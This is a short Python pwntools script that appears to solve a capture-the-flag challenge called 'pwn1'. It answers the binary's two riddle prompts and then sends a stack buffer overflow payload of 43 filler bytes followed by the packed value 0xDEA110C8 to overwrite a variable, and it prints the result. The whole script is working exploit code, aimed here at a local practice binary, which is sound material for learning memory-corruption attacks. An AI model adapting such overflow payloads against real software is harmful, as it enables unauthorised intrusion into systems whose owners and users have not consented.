#!/home/ryohz/.pyenv/shims/python

import pwn
import struct

io = pwn.process("./pwn1")

io.sendline(b"Sir Lancelot of Camelot")
io.sendline(b"To seek the Holy Grail.")

payload = b"A" * 43 + struct.pack("I", 0xDEA110C8)
io.sendline(payload)

res = io.recvall(timeout=1).decode()

print(res)
